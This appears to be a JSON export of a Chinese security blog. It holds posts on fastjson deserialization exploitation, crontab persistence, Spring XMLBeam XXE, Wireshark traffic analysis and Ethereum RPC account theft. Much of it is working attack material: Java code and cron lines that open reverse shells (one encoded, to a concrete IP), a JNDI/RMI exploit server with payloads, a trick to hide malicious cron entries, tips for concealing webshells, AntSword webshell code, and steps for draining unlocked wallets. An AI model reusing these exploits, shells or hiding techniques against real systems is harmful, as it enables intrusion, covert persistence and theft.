&gt;&amp;5; done&quot;] as String[]; 修改后如下,可以反弹shell，还有其他方式暂时未试，详情看使用java反弹shell import java.lang.Runtime; import java.lang.Process; public class fastjson { public fastjson(){ try{ Runtime rt = Runtime.getRuntime(); //String[] commands = {\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=}|{base64,-d}|{bash,-i}\"}; //String[] commands = {\"/bin/bash\", \"-c\", \"'/bin/bash -i >&amp; /dev/tcp/118.24.146.204/8550 0>&amp;1'\"}; Process pc = rt.exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5&lt;>/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2>&amp;5 >&amp;5; done\"}); //System.out.println(commands[0]); pc.waitFor(); }catch(Exception e){ e.printStackTrace(); } } public static void main(String[] argv){ fastjson e = new fastjson(); } } 漏洞分析根据分析，这次遇到的fastjson漏洞不是最近1.2.47版本的，而是之前1.2.24此处反编译的FastJson_JdbcRowSetImpl_JNDI_RMIServer如下创建rmi（java 本身的rpc框架） import cn.com.topsec.fastjson.FastJson_JdbcRowSetImpl_JNDI_RMIServer; import com.sun.jndi.rmi.registry.ReferenceWrapper; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import javax.naming.NamingException; import javax.naming.Reference; public class FastJson_JdbcRowSetImpl_JNDI_RMIServer { public static void start(String httpServer, int rmiPort, String hostName) throws AlreadyBoundException, RemoteException, NamingException { System.out.println(\"* Open JNDI-RMI Listener on \" + rmiPort); System.out.println(\"\\n [*] HTTPSERVER = \" + httpServer); System.out.println(\" [*] RMIPORT = \" + rmiPort); System.setProperty(\"java.rmi.server.hostname\", hostName); Registry registry = LocateRegistry.createRegistry(rmiPort); Reference reference = new Reference(\"CommandObject\", \"CommandObject\", httpServer); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"Object\", referenceWrapper); } public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException { String httpServer = args[0]; int rmiPort = Integer.parseInt(args[1]); String[] httpServerHost = httpServer.split(\":\"); String hostName = httpServerHost[0]; httpServer = \"http://\" + httpServer + \"/\"; start(httpServer, rmiPort, hostName); System.out.println(\"\\n [*] Payload���\"); System.out.println(\" [+] {\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://\" + httpServerHost[0] + \":\" + rmiPort + \"/Object\\\",\\\"autoCommit\\\":true}\"); System.out.println(\"\\n [*] enjoy���\"); } } 创建RMI Serverpackage com.luckyqiao.rmi; import java.io.IOException; import java.rmi.AlreadyBoundException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.UnicastRemoteObject; public class RMIServer { public static void main(String[] args) { RemoteHello remoteHello = new RemoteHelloImpl(); try { RemoteHello stub = (RemoteHello) UnicastRemoteObject.exportObject(remoteHello, 4000); //导出服务，使用4000端口 Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 8000); //获取Registry registry.bind(&quot;hello&quot;, stub); //使用名字hello，将服务注册到Registry } catch (AlreadyBoundException | IOException e) { e.printStackTrace(); } } } 参照sky 的rmi server 进行修改如下 import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; /** * @author sky */ public class rmiserver { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new Reference(\"CommandObject\", \"CommandObject\",\"http://localhost:80/\"); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"Exploit\",referenceWrapper); } } 整理下 利用方式【1】首先准备一个 RMI Server【2】开启对应的httpserver【3】CommandObject.class 执行文件【4】利用poc 1.2.47 与1.2.24的区别在该漏洞情况下 poc与1.2.47 稍有区别1.2.24 poc如下 {&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:389/obj&quot;,&quot;autoCommit&quot;:true} 根据poc来看 是进行了黑名单的绕过，在1.2.24的漏洞情况下，将”com.sun.rowset.JdbcRowSetImpl”进行了黑名单的处理，但在1.2.47中又给绕过了 { &quot;name&quot;: { &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; }, &quot;x&quot;: { &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://ip:port/Exploit&quot;, &quot;autoCommit&quot;: true } } 绕过分析-待续fastjson黑名单在1.2.48的补丁中将 “java.lang.Class”给进行拉黑处理了 参考fastjson-blacklistFastJson-JdbcRowSetImpl使用java反弹shellfastjson =&lt; 1.2.47 反序列化漏洞浅析","categories":[{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/categories/Web渗透/"},{"name":"漏洞学习","slug":"Web渗透/漏洞学习","permalink":"http://yoursite.com/categories/Web渗透/漏洞学习/"}],"tags":[{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/tags/Web渗透/"},{"name":"漏洞学习","slug":"漏洞学习","permalink":"http://yoursite.com/tags/漏洞学习/"},{"name":"fastjson","slug":"fastjson","permalink":"http://yoursite.com/tags/fastjson/"}]},{"title":"计划任务","slug":"内网渗透/计划任务","date":"2019-07-11T14:00:00.000Z","updated":"2019-07-25T10:16:08.294Z","comments":true,"path":"2019/07/11/内网渗透/计划任务/","link":"","permalink":"http://yoursite.com/2019/07/11/内网渗透/计划任务/","excerpt":"","text":"计划任务[TOC] 计划任务linux 计划任务 结合 NC执行后门 查看crontab执行情况查看其日志的方式 tail -f /var/log/cron crontab 命令Usage: crontab [options] file crontab [options] crontab -n [hostname] Options: -u &lt;user&gt; define user -e edit user&#39;s crontab -l list user&#39;s crontab -r delete user&#39;s crontab -i prompt before deleting -n &lt;host&gt; set host in cluster to run users&#39; crontabs -c get host in cluster to run users&#39; crontabs -s selinux context -x &lt;mask&gt; enable debugging Default operation is replace, per 1003.2 配置文件[root@VM_0_2_centos ~]# cat /etc/crontab SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root # For details see man 4 crontabs # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed 配置文件为/etc/crontab存放执行的crontab脚本文件的路径为/etc/cron.d存放每个用户的crontab任务的目录在debian系统中一般为/var/spool/cron/crontabs，centos系统中一般为/var/spool/cron 利用crontab 反弹shell常见的通过corntab反弹shell方法 bash 反弹shell测试设备A：服务端 centosB：客户端 ubuntu bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1 命令解析参数 描述 -c string 从string中读取命令并处理他们 -r 启动限制性shell,限制用户在默认目录下活动 -i 启动交互性shell,允许用户输入 -s 从标准输入读取命令 即启用交互式shell linux shell下常用的文件描述符是： 1. 标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； 2. 标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； 3. 标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt; 其中 “&gt;&amp;” 和 “&amp;&gt;”的效果一样都是将标准错误输出重定向到标准输出，即和”&gt; xxx 2&gt;&amp;1”是一样的。这里的”&amp;” 类似于取地址符此处 客户端的输入和输出都在服务端上展示，服务端无法直接输入 在man bash 里面解释为同理 “n&lt;&amp;word” 是word复制给n， “n&gt;&amp;word”是把word复制给n“0&gt;&amp;1”就是把 0对应的设备改成的1对应的设备，那也就是socket。这就表明了 stdin就是从socket中读取数据，然后再执行命令，把bash的命令行返回内容通过stdout发到socket。 /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/ crontab 反弹 shellbashcrontab -e选择常见编辑器后，写入执行命令 */1 * * * * bash -i &amp;&gt; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1 */1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1 以及段师傅的 /bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39; 别忘了重启 /etc/init.d/cron restart 在ubuntu中 踩了个大坑，这条命令在centos中可以执行，但是在ubuntu中不行。检查日志 “/var/log/syslog” 发现计划任务执行了，但是结果没建立连接 修改下软连接 ln -sf bash /bin/sh 推测是原ubuntu 版本的bin/sh 软连接 连接到dash修改后的软连接：这里/bin/sh软连接是sh -&gt; dash 然后rbash -&gt; bash关键问题是 bash和dash的区别 从Ubuntu 6.10开始，默认使用dash(theDebian Almquist Shell)而不是bash(the GNUBourne-Again Shell). 但Login Shell还是bash. 原因是dash更快、更高效，而且它符合POSIX规范。Ubuntu在启动的时候会运行很多shell脚本，使用dash可以加快启动速度 bash和dash在/bin/sh 使用中的区别-待续将该ubuntu中的/bin/sh 软连接改回到dash，查看该问题报错 nc在centos下可以使用 */1 * * * * nc -e /bin/sh ip port 别忘了重启 service crond restart */1 * * * * perl -e &#39;use Socket;$i=&quot;vps.ip&quot;;$p=8989;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39; 隐藏计划任务在使用计划任务入侵的时候，可以简单的隐藏下计划任务，以便于不那么容易被发现 (crontab -l;printf &quot;*/1 * * * * /usr/bin/nc ip 8550 -e /bin/sh;\\rno crontab for `whoami`%100c\\n&quot;)|crontab - 这个时候直接用crontab -l 输出的时候是直接显示no crontab for 当前用户。 注意这里有一个坑点，osx系统中的nc 没有-e 参数（在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个GAPING_SECURITY_HOLE常量)，也就是说我们不能通过-e选项绑定目标的shell，使得我们在利用上受到限制，但这种情况下是不是就），这里可以看看mail文件”/var/mail/name”里面的报错 nc 缺少 -e 参数的解决方式dev/tcp在缺少 -e得时候，可以使用bash dev/tcp/ip/port（在有/dev/tcp的bash的前提下） mknod FIFOmkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f mkfifo 或者 mknod /tmp/backpipe p ;/bin/sh 0&lt; /tmp/backpipe | nc ip 443 1&gt; /tmp/backpipe 隐藏文件/文件夹Linux/Unix 藏文件和文件夹Linux/Unix 下想藏 Webshell 或者后门什么的，可以利用一下隐藏文件夹和文件。 方法一比如创建一个名字开头带 . 的 Webshell 或者文件夹，默认情况下是不会显示出来的，浏览器访问的时候加点访问就行。（查看方法：ls -a） touch .webshell.php 创建名字为 .webshell.php 的文件 mkdir .backdoor/ 创建名字为 .backdoor 的文件夹 终极方法在管理员喝多了或者脑子转不过来的情况下，是绝对不会发现的！至少我用了这么久是没几个发现的。是文件的话浏览器访问直接输 … 就行，目录同理。 touch … 创建名字为 … 的文件 mkdir … 创建名字为 … 的文件夹 隐藏参考 解决ubuntu-crontab反弹shell失败的问题 Netcat without -e? No Problem!","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/categories/内网渗透/"},{"name":"计划任务","slug":"内网渗透/计划任务","permalink":"http://yoursite.com/categories/内网渗透/计划任务/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/tags/内网渗透/"},{"name":"计划任务","slug":"计划任务","permalink":"http://yoursite.com/tags/计划任务/"}]},{"title":"XXE实例及应用3","slug":"Web渗透/XXE/XXE实例及应用3","date":"2019-07-08T14:00:00.000Z","updated":"2019-07-25T16:57:22.390Z","comments":true,"path":"2019/07/08/Web渗透/XXE/XXE实例及应用3/","link":"","permalink":"http://yoursite.com/2019/07/08/Web渗透/XXE/XXE实例及应用3/","excerpt":"","text":"Java - XXE Java - XXEXXE在Java 代码中的漏洞示例 JAVA常见XXE漏洞写法案例spring-data-XMLBean XXE复现分析搭建环境【1】下载环境 git clone https://github.com/spring-projects/spring-data-examples.git 【2】下载安装maven并配置好环境变量因为这里的新版本已经对次做了修复，所以这里的版本改为 2.0.5 &lt;dependency&gt; &lt;groupId&gt;org.springframework.data&lt;/groupId&gt; &lt;artifactId&gt;spring-data-commons&lt;/artifactId&gt; &lt;version&gt;2.0.5.RELEASE&lt;/version&gt; &lt;/dependency&gt; 【3】配置好环境变量后，进入对应的web/projection 打包运行 mvn package 部署运行进入对应目录搭建运行 java -jar spring-data-web-projection-2.0.0.BUILD-SNAPSHOT.jar poc复现构造post请求比较奇怪的一点是，正常的xxe请求 任意文件读取 都应该是 file:///这里直接执行也行 注意 这里的content-type 类型，得支持，改为 application/xml xxe支持的content-type fuzz一下在位置中application/xhtml+xml 与 application/xml 的效果是一样的 注 Accept代表发送端（客户端）希望接受的数据类型。 比如：Accept：text/xml; 代表客户端希望接受的数据类型是xml类型 Content-Type代表发送端（客户端|服务器）发送的实体数据的数据类型。 比如：Content-Type：text/html; 代表发送端发送的数据格式是html。 漏洞分析从该位置可以知道漏洞位置是在 firstname和lastname的接收处理，所以跟踪下idea下的该函数。该maven项目demo中就application和userController 两个函数，从主函数跟踪。可以看到post请求中的user.getFirstname(),user.getLastname() 方法 跟踪下 会发现，在调用responseEntity的时候就已经读取文件了 参考网上的分析，漏洞的处理函数位是在org.xmlbeam.ProjectionInvocationHandler:invokeReadProjection()处理 顺带在这里看下相对路径处理成功的原因 待补充细分 在提交http/post请求后，跟踪下 protected &lt;T> Object readWithMessageConverters 在对该post参数进行处理时，这里还没进行文件读取转换 漏洞原因是在于XMLBeam漏洞版本中没有限制外部实体 参考JAVA常见的XXE漏洞写法和防御spring-data-XMLBean XXE复现分析XXE with Spring Data’s XMLBeam 分析框架基础——全面解析Java注解","categories":[{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/categories/Web渗透/"},{"name":"漏洞学习","slug":"Web渗透/漏洞学习","permalink":"http://yoursite.com/categories/Web渗透/漏洞学习/"}],"tags":[{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/tags/Web渗透/"},{"name":"漏洞学习","slug":"漏洞学习","permalink":"http://yoursite.com/tags/漏洞学习/"},{"name":"XXE","slug":"XXE","permalink":"http://yoursite.com/tags/XXE/"}]},{"title":"","slug":"工具使用/wireshark使用记录","date":"2019-06-10T06:26:42.709Z","updated":"2019-07-26T08:58:37.339Z","comments":true,"path":"2019/06/10/工具使用/wireshark使用记录/","link":"","permalink":"http://yoursite.com/2019/06/10/工具使用/wireshark使用记录/","excerpt":"","text":"wireshark 使用记录 （-）[TOC] 恶意流量检查在一台服务器上发现有恶意木马，对该设备进行wireshark 抓包分析，很久没用过wireshark了，记录回顾下。 wireshark 流量分析过滤协议 ctrl+F 或者 http contains”xxx” 来过滤协议 过滤IPIP源地址：ip.src ==192.168.1.1 IP目的地址：ip.dst== 192.168.1.1 IP地址（包括源和目的）：ip.addr== 192.168.1.1 过滤端口TCP端口：tcp.port==80 TCP目的端口：tcp.dstport == 80 TCP源端口：tcp.srcport == 80 UDP端口：udp.port eq 15000 TCP 1-80之间的端口：tcp.port &gt;= 1 and tcp.port &lt;= 80 过滤协议http、tcp、udp、arp、icmp、http、smtp、ftp、dns 等 过滤包长度整个UDP数据包：udp.length==20 TCP数据包中的IP数据包：tcp.len&gt;=20 整个IP数据包：ip.len==20 整个数据包：frame.len==20 HTTP模式过滤请求方法为GET：http.request.method==“GET” 请求方法为POST：http.request.method==“POST” 指定URI：http.request.uri==“/img/logo-edu.gif” 请求或相应中包含特定内容：http contains “FLAG” 实际分析病毒端口分析因为在服务器上发现的病毒是在tina文件夹下，tina程序执行 tina_daemon.exe,监听端口是2525，在发现是无链接，所以在拿到数据包的时候首先过滤2525 端口经检测 无数据 ip分析提取下数据包中包含的ip地址进行分析下 外网ip 42.81.104.4 天津电信 无信息 美图 49.7.50.36 北京市北京市 电信 无信息 360 52.188.72.233 美国 微软 59.49.81.218 山西省太原市 电信 动态ip windows 更新 101.227.27.36 上海市上海市 电信 360 221.230.147.106 江苏泰州 电信 微软 内网ip： 探测下进行ping 探测的设备 ping 探测失败的信息89.0.0.241 是DNS服务器 DNS协议解析到360天擎 服务端 除此之外还解析请求了两个 内网，但未解析成功分别是10.185.49.42172.17.136.21 分析所有连接到ip结合威胁情报 检测所有的ip，未发现敏感连接 病毒分析回过头来看下木马程序 根据这个信息google了一下RemCom 木马工具行为分析该木马主要是一个开源的psexec 远程管理工具工具的说明如下： RemCom是开源的:。 您可以根据需要在计算机上运行任意数量的远程命令 您可以直接执行内部命令（net，netsh，ipconfig）：RemCom \\\\ foo-bar-system net start snmp 您可以在没有任何telnet服务器的情况下与远程计算机建立轻型“telnet”连接：RemCom.exe \\\\ foo-bar-system cmd 您还可以复制远程计算机上的任何文件并接收其输出。 RemCom在远程计算机上创建一个小的（&lt;1 KB）服务（它在运行时从自身中提取它）。 所有通信都通过命名管道和RPC完成。 应用程序在成功断开连接时删除了连接和服务的痕迹（整洁吧？ 它允许在远程Windows系统上执行进程，复制文件，处理输出并将其流回。允许直接使用完整的交互式控制台执行远程shell命令 分析完发现这个是一个正常的数据包，笔记写得没什么意思，又不想去逆向分析,就找找其他wireshark分析的案列看看 数据分析案例直接搜索字符串，然后跟踪数据流如下 想走捷径，在这个基础上尝试利用ftp的被动模式 PSAV 直接连接，结果却发现密码不正确，认证失败，这就很尴尬了，只有继续老老实实的分析数据包。查看数据包，在数据包中直接导出文件：我这里直接使用的foremost导出 foremost -v -i name.pcap 导出了一个压缩包和key.log； 看一下key.log记录的是Session Key TLS密钥（借用firfox或chrome配置记录，即可记录该信息） 导出来 看下频谱图 跳下采样率，解压 wireshark tcp三次握手众所周知，tcp三次握手传输过程 第一次 client --------&gt; server syn 客户端发送syn包（syn=j）到服务器，并进入到syn_sent状态，等待服务端确认 第二次 server --------&gt; client syn + ack 务器收到syn包，必须确认客户的SYN(ack=j+1)，同时自己也发送一个SYN包(syn=k)，即SYN+ACK包，此时服务器进入SYN_RECV状态; 第三次 client --------&gt; server ack 第三次握手:客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED(TCP连接成功)状态，完成三次握手 wireshark 分析攻击现象DDOS在进行DDOS攻击时，wireshark从数据包中能明显看到该现象 SYN Flood flag 常见标识：在TCP层，有个FLAGS字段，这个字段有以下几个标识：SYN, FIN, ACK, PSH, RST, URG.其中，对于我们日常的分析有用的就是前面的五个字段。它们的含义是：SYN表示建立连接，FIN表示关闭连接，ACK表示响应，PSH表示有 DATA数据传输，RST表示连接重置。其中，ACK是可能与SYN，FIN等同时使用的，比如SYN和ACK可能同时为1，它表示的就是建立连接之后的响应，如果只是单个的一个SYN，它表示的只是建立连接。TCP的几次握手就是通过这样的ACK表现出来的。但SYN与FIN是不会同时为1的，因为前者表示的是建立连接，而后者表示的是断开连接。RST一般是在FIN之后才会出现为1的情况，表示的是连接重置。一般地，当出现FIN包或RST包时，我们便认为客户端与服务器端断开了连接；而当出现SYN和SYN＋ACK包时，我们认为客户端与服务器建立了一个连接。PSH为1的情况，一般只出现在 DATA内容不为0的包中，也就是说PSH为1表示的是有真正的TCP数据包内容被传递。TCP的连接建立和连接关闭，都是通过请求－响应的模式完成的。、 这里面案例比较有意思的一点：使用TTL分析发现攻击者的蛛丝马迹，当使用随机源进行DDoS攻击时，虽然使用了伪造源地址进行攻击，但攻击者无法伪造攻击主机与目标主机之间的位置关系。有时候通过观察数据包的TTL值变化，也能够获得攻击者的蛛丝马迹，为攻击防御提供辅助支持。下图所示的这个攻击程序并没有修改攻击数据包的TTL值，所有的攻击数据包使用相同的TTL值。这个攻击数据包是由局域网内的一个windows计算机发出的。 UDP FLOODICMP FLOODwireshark 记录antsword起因是看了下记一次wireshark分析中国菜刀http请求想着我一般用蚁剑，于是看看AntSword的利用特征，搭建环境抓包这部分按下不表，直入正题 不知道为啥 同样的木马+antsword在osx 本地系统上无法执行，一直在报错，还没细看 虚拟终端时可以明显看到 UA有 antsword的标志其中连接shell 执行语句如下： 0x1291b5bcd176f=L2Jpbi9zaA==&amp;0x39e42e841a89c=Y2QgIi92YXIvd3d 3L2h0bWwiO3B3ZDtlY2hvIFtTXTtwd2Q7ZWNobyBbRV0=&amp;ant= @ini_set(&quot;display_errors&quot;, &quot;0&quot;); @set_time_limit(0); function asenc($out){return $out;}; function asoutput(){ $output=ob_get_contents(); ob_end_clean(); echo &quot;26623&quot;; echo @asenc($output); echo &quot;e6e71&quot;; } ob_start(); try { $p=base64_decode($_POST[&quot;0x1291b5bcd176f&quot;]); $s=base64_decode($_POST[&quot;0x39e42e841a89c&quot;]); $d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $c=substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;{$s}\\&quot;&quot;:&quot;/c \\&quot;{$s}\\&quot;&quot;; $r=&quot;{$p}{$c}&quot;; function fe($f) { $d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;)); if(empty($d)){$d=array();} else{ $d=array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d)); } return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d)); }; function runcmd($c) { $ret=0; if(fe(&#39;system&#39;)){@system($c,$ret);} elseif(fe(&#39;passthru&#39;)) { @passthru($c,$ret); } elseif(fe(&#39;shell_exec&#39;)){print(@shell_exec($c));} elseif(fe(&#39;exec&#39;)){@exec($c,$o,$ret);print(join(&quot;&quot;,$o));} elseif(fe(&#39;popen&#39;)) { $fp=@popen($c,&#39;r&#39;); while(!@feof($fp){print(@fgets($fp, 2048));} @pclose($fp); } elseif(fe(&#39;antsystem&#39;)){@antsystem($c);} else{$ret = 127;} return $ret; }; $ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;); print ($ret!=0)?&quot;ret={$ret}&quot;:&quot;&quot;;; }catch(Exception $e) {echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die(); 获取当前脚本运行目录-获取绝对路径 dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;] 捕获分组获得字符串中的参数 substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;{$s}\\&quot;&quot;:&quot;/c \\&quot;{$s}\\&quot;&quot;; 执行命令 runcmd($r.&quot; 2&gt;&amp;1&quot;) 下载文件0x97c1110a314d1=L3Zhci93d3cvaHRtbC9pbmZvLnBocA==&amp;ant= @ini_set(&quot;display_errors&quot;, &quot;0&quot;); @set_time_limit(0); function asenc($out) { return $out; }; function asoutput() { $output=ob_get_contents(); ob_end_clean(); echo &quot;d6192&quot;; echo @asenc($output); echo &quot;96e2b&quot;; } ob_start(); try { $F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST[&quot;0x97c1110a314d1&quot;]): $_POST[&quot;0x97c1110a314d1&quot;]); $fp=@fopen($F,&quot;r&quot;); if(@fgetc($fp)) { @fclose($fp); @readfile($F); } else{ echo(&quot;ERROR:// Can Not Read&quot;); }; } catch(Exception $e){echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die(); 这里比较有区别的地方，使用了fopen读取文件内容 进行下载 $fp=@fopen($F,&quot;r&quot;); 参考[wireshark还原数据文件](http://blog.sina.com.cn/s/blog_e8e60bc00102vfd9.html)破解ssl加密数据包使用Wireshark分析并发现DDoS攻击WireShark分析针对路由器的linux木马","categories":[],"tags":[]},{"title":"ETH 漏洞复现","slug":"区块链/ETH/ETH-1/偷渡漏洞_拒绝服务","date":"2019-03-13T16:00:00.000Z","updated":"2019-07-21T04:31:46.067Z","comments":true,"path":"2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/","link":"","permalink":"http://yoursite.com/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/","excerpt":"","text":"[TOC] ETH系统环境 ubuntu 16 搭建私有测试链 下载相关的go-ethereum 协议 git clone https://github.com/ethereum/go-ethereum.git 安装go环境 wget https://dl.google.com/go/go1.12.linux-amd64.tar.gz tar -C /usr/local -xzf go1.12.linux-amd64.tar.gz 修改配置环境vim ~/.bashrc export GOROOT=/usr/local/go export GOPATH=/home/go_demo export PATH=$PATH:$GOPATH:/usr/local/go/bin make geth 连接测试网络 因为仅仅是作为测试链来使用，这里就不连接到主网了，毕竟同步数据会消耗长时间和硬盘。 ./build/bin/geth –testnet console 开启json-rpc 端口 geth –rpc –rpcaddr –rpcport RPC常用调用格式 cur addr:port -X POST --data &#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:id, &quot;method&quot;:&quot;${method}&quot;,&quot;params&quot;:&quot;${params}&quot;}&#39; 创建私有链-待续部署测试合约-待续合约创建子链-待续 ETH 节点JSON-RPC测试RPC接口： web3_clientVersion web3_sha3 net_version net_peerCount net_listening eth_protocolVersion eth_syncing eth_coinbase eth_mining eth_hashrate eth_gasPrice eth_accounts eth_blockNumber eth_getBalance eth_getStorageAt eth_getTransactionCount eth_getBlockTransactionCountByHash eth_getBlockTransactionCountByNumber eth_getUncleCountByBlockHash eth_getUncleCountByBlockNumber eth_getCode eth_sign eth_sendTransaction eth_sendRawTransaction eth_call eth_estimateGas eth_getBlockByHash eth_getBlockByNumber eth_getTransactionByHash eth_getTransactionByBlockHashAndIndex eth_getTransactionByBlockNumberAndIndex eth_getTransactionReceipt eth_getUncleByBlockHashAndIndex eth_getUncleByBlockNumberAndIndex eth_getCompilers eth_compileLLL eth_compileSolidity eth_compileSerpent eth_newFilter eth_newBlockFilter eth_newPendingTransactionFilter eth_uninstallFilter eth_getFilterChanges eth_getFilterLogs eth_getLogs eth_getWork eth_submitWork eth_submitHashrate db_putString db_getString db_putHex db_getHex shh_post shh_version shh_newIdentity shh_hasIdentity shh_newGroup shh_addToGroup shh_newFilter shh_uninstallFilter shh_getFilterChanges shh_getMessages 创建钱包启动节点后，调用节点自身的console，创建账号 &gt; eth.accounts 查询钱包用户 &gt; personal.newAccount() 创建钱包用户这里注意下，当一个节点绑定多个钱包账户的时候，挖矿的收益会默认在第一个创始账户中，这个时候要改变收益账号 &gt; miner.setEtherbase(eth.accounts[1]) 成功改变会返回 true 查询获益钱包账户 &gt; eth.coinbase &gt;personal.unlockAccount(address,passwd,time) 解锁钱包用户 查询余额 curl -X POST -H &quot;Content-Type&quot;:application/json --data &#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;:&quot;eth_getBalance&quot;,&quot;params&quot;:[&quot;0xde1e758511a7c67e7db93d1c23c1060a21db4615&quot;,&quot;latest&quot;],&quot;id&quot;:67}&#39; 172.25.0.10:8545 发起转账请求 curl -X POST -H &quot;Content-Type&quot;:application/json --data &#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;: [{ &quot;from&quot;: &quot;0xde1e758511a7c67e7db93d1c23c1060a21db4615&quot;, &quot;to&quot;: &quot;0xd64a66c28a6ae5150af5e7c34696502793b91ae7&quot;, &quot;value&quot;: &quot;0x1&quot; }], &quot;id&quot;:67}&#39; 172.25.0.10:8545 但是注意一下在此处的 当余额为0的时候，会报错，报错信息如下： &quot;error&quot;:{&quot;code&quot;:-32000,&quot;message&quot;:&quot;exceeds block gas limit&quot;} 待深究 其中 personal_listWallets 接口可以查看所有账户的解锁情况。 偷渡漏洞验证以太坊交易流程 用户发起转账请求。 以太坊对转账信息进行签名 校验签名后的信息并将信息加入交易缓存池 (txpool) 从交易缓存池中提取交易信息进行广播 此处的核心便是对personal_unlockAccount的爆破攻击，在爆破成功后或者用户自身交易解锁的空余时间内，对该接口进行解锁，在解锁后，攻击者便调用转账函数，对该接口以较高的gas进行转账处理。 防范方法： personal.sendTransaction 进行转账 关于 personal.sendTransaction与personal_unlockAccount对区别这也就意味着如果执行了 unlockAccount() 函数、没有超时的话，从 ipc、rpc 调用 SendTransaction() 都会成功签名相关交易 偷渡漏洞接口爆破爆破的目标personal_unlockAccount 接口变成了 personal_sendTransaction 接口 开启挖矿 curl -X POST -H &quot;Content-Type&quot;:application/json --data &#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;:&quot;miner_start&quot;,&quot;params&quot;:[],&quot;id&quot;:67}&#39; 172.25.0.10:8545 或者 用本地console miner.start(1) 漏洞复现这里用docker 环境下的python3.6docker run -it python:3.6 /bin/bash 探测节点端口是否开放、获取当前区块高度直接调用RPC 8545端口 >>> from web3 import Web3,HTTPProvider >>> web3=Web3(HTTPProvider(\"http://xx.xx.xx.xx:8545/\")) >>> web3.eth.blockNumber 探测节点上是否绑定有相关账户>>> web3.eth.accounts 查询下账户相关余额>>> web3.eth.getBalance(web3.eth.accounts[]) 调用RPC爆破账户轮询监控节点解锁账户解锁期间进行转账没什么可写的，就是用个循环，调用web3.eth.sendTransaction 不停的进行转账请求 离线状态下偷渡漏洞跟偷渡漏洞实质没有区别，只是区别在于，不是在解锁期间进行转账，是在解锁期间调用转账签名eth_signTransaction，在账户解锁期间按照 nonce 